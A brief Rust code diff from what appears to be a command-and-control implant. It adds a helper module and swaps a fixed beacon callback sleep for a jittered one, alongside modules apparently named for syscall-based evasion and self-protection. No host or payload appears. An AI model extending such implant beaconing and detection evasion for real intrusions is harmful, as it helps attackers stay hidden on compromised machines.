@@ -20,6 +20,7 @@ mod features {
 mod hellshall;
 mod selfprotect;
 mod worker;
+mod helpers;
 
 use std::{thread, time::Duration};
 
@@ -47,6 +48,6 @@ fn run() {
         if let Err(e) = tasking::getTasking() {
             eprintln!("Tasking error: {}", e);
         }
-        thread::sleep(Duration::from_millis(config::callback_interval * 1000));
+        helpers::sleep_with_jitter();
     }
 }
